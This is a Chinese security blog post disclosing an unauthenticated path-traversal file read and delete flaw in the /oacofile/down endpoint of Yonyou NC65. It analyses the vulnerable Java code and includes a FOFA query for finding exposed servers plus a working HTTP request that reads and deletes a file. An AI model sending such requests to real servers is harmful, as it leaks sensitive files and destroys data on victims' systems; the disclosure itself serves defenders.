---
title: "用友NC oacofile/down 文件读取/删除漏洞"
source: https://mrxn.net/jswz/yonyou-nc-oacofile-down-fileread-delete.html
asset_dir: assets/用友nc-oacofiledown-文件读取删除漏洞
---

# 用友NC oacofile/down 文件读取/删除漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/13 08:21
- 910浏览
- [0评论](#comment)
- 29分钟阅读

---

# 漏洞简介

[用友](https://mrxn.net/tag/用友)NC 是一种商业级的[企业资源规划](#)，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC电子商务平台的 `/oacofile/down` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)+**删除漏洞**，未经身份验证的恶意攻击者利用该漏洞读取服务器上任意文件内容并删除文件，造成系统敏感信息泄露或导致系统宕机。

漏洞修复方案

# 影响版本

NC65

# fofa语法

> `app="用友-UFIDA-NC"`

# 漏洞分析

直接看 `OACOFileSystemAction` 对应的 `down` 方法实现部分

```
public void down(@Param(name = "filename") String fileName, @Param(name = "excelname") String excelName) throws IOException {
        fileName = StringUtil.convertToCorrectEncoding(fileName);
        excelName = URLDecoder.decode(excelName, "UTF-8");
        String tmpDirPath = ExcelUtils.getFileDirPath();
        String excelPath = tmpDirPath + fileName;
        File excel = new File(excelPath);
        if (excel.exists()) {
            OutputStream os = null;
            FileInputStream in = null;

            try {
                this.response.reset();
                this.response.setCharacterEncoding("UTF-8");
                this.response.setContentType("APPLICATION/OCTET-STREAM");
                if (LfwRuntimeEnvironment.getBrowserInfo().isIE()) {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + URLEncoder.encode(excelName, "UTF-8").replace("+", "%20") + "\"");
                } else if (LfwRuntimeEnvironment.getBrowserInfo().isFirefox()) {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + new String(excelName.getBytes("GBK"), "ISO-8859-1"));
                } else {
                    this.response.setHeader("Content-Disposition", "attachment; filename=\"" + URLEncoder.encode(excelName, "UTF-8") + "\"");
                }

                os = this.response.getOutputStream();
                in = new FileInputStream(excelPath);
                byte[] b = new byte[1024];
                int i = 0;

                while((i = in.read(b)) > 0) {
                    os.write(b, 0, i);
                }

                os.flush();
                in.close();
                in = null;
                os.close();
                os = null;
                excel.delete();
```

参数 `filename` 直接拼接进 `excelPath` 文件读取路径里，而 `tmpDirPath = ExcelUtils.getFileDirPath();` 实现如下

企业资源规划

```
public static String getFileDirPath() {
        String tmpDirPath = ncHomePath + "/hotwebs/portal/oatemp/";
        File tmpf = new File(tmpDirPath);
        if (!tmpf.exists()) {
            tmpf.mkdirs();
        }

        return tmpDirPath;
    }
```

基本路径为 `/home/hotwebs/portal/oatemp/` 此路径为nc默认安装时的基本路径，拼接后直接用 `new File` 读取文件，将内容输出在body中，且使用 `excel.delete();` 删除读取的文件。

# 漏洞复现

> **谨慎测试，读取文件后会删除文件**！！！

```
POST /portal/pt/oacofile/down?pageId=login HTTP/1.1
Host: nc65.mrxn.net
Content-Type: application/x-www-form-urlencoded

excelname=test&filename=../../../webapps/nc_web/licence.txt
```

[![用友NC oacofile/down 文件读取/删除漏洞](images/img-001-33d7bf8a8bfd.webp)](https://image.mrxn.net/ef55fe90f48e4dcebedf380b68008833.webp)

成功读取web根目录 `licence.txt` 文件内容

软件

但是文件也**被删除**了！谨慎测试！

[![用友NC oacofile/down 文件读取/删除漏洞](images/img-002-dcc12b69eff1.webp)](https://image.mrxn.net/c891273ef9184b389843cf4777a70ef0.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
